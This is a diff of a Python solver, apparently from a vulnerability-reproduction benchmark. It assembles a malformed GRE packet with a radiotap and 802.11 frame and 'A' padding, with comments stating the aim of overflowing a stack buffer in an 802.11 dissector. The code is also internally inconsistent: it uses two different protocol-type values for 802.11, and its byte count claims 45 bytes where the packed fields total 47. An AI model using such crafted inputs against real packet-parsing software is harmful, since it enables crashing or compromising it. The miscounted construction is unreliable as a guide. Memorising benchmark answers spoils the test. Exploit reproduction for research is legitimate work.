@@ -1,46 +1,44 @@
 import struct
-import subprocess
-import tempfile
-import os
-import tarfile
-from pathlib import Path
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Ground-truth length is 45 bytes
-        # Craft a GRE packet that will trigger the 802.11 dissector
+        # GRE header: flags/version + protocol type for 802.11
+        # Flags and version (0x2000 = checksum present, version 0)
+        gre_header = struct.pack(">HH", 0x2000, 0x8200)
         
-        # GRE header structure (RFC 2784):
-        # 0-1: Flags and Version
-        # 2-3: Protocol Type
-        # 4-7: Key (optional)
-        # 8-11: Sequence (optional)
+        # GRE checksum (2 bytes) - arbitrary
+        gre_checksum = struct.pack(">H", 0x0000)
         
-        # For this vulnerability, we need:
-        # 1. Set Protocol Type to 0x0008 (802.11)
-        # 2. Provide minimal data that will cause overflow in 802.11 dissector
+        # GRE offset (2 bytes)
+        gre_offset = struct.pack(">H", 0x0000)
         
-        poc = bytearray()
+        # Construct the pseudoheader that 802.11 dissector expects
+        # RadioTap header (simplified)
+        # Header revision, pad, length (8 bytes), present flags
+        radiotap_header = struct.pack("<BBHI", 0x00, 0x00, 0x0008, 0x00000000)
         
-        # GRE Flags and Version
-        # C = 0, R = 0, K = 0, S = 0, s = 0, Recur = 0, Flags = 0, Ver = 0
-        # This is the minimal header without options
-        poc.extend(struct.pack('>H', 0x0000))  # Flags and Version
+        # 802.11 frame (simplified)
+        # Frame Control field (data frame), Duration ID
+        frame_control = struct.pack("<HH", 0x0800, 0x0000)
         
-        # Protocol Type: 0x0008 = 802.11
-        poc.extend(struct.pack('>H', 0x0008))
+        # MAC addresses (6 bytes each)
+        addr1 = b"\xff\xff\xff\xff\xff\xff"  # Broadcast
+        addr2 = b"\x00\x00\x00\x00\x00\x00"
+        addr3 = b"\x00\x00\x00\x00\x00\x00"
         
-        # No Key or Sequence fields since flags don't indicate them
+        # Sequence control
+        seq_ctrl = struct.pack("<H", 0x0000)
         
-        # Now add payload that will trigger overflow in 802.11 dissector
-        # The 802.11 dissector expects radio tap header but gets GRE flags/version
-        # We need to provide enough data to cause stack overflow when dissector
-        # tries to parse what it thinks is radio tap header
+        # Payload to trigger overflow - fill remaining bytes
+        # Total length needed: 45 bytes
+        # Current length: gre_header(4) + checksum(2) + offset(2) + radiotap(8) + 
+        #                 frame_control(2) + addr1(6) + addr2(6) + addr3(6) + seq_ctrl(2) = 38 bytes
+        # Need 7 more bytes to reach 45
+        payload = b"A" * 7
         
-        # Add padding/overflow data
-        # 41 bytes of 'A' to reach total 45 bytes (4 + 41)
-        # This should overflow any reasonable stack buffer in radio tap parsing
-        overflow_data = b'A' * 41
-        poc.extend(overflow_data)
+        # Combine all parts
+        poc = (gre_header + gre_checksum + gre_offset + 
+               radiotap_header + frame_control + 
+               addr1 + addr2 + addr3 + seq_ctrl + payload)
         
-        return bytes(poc)
+        return poc
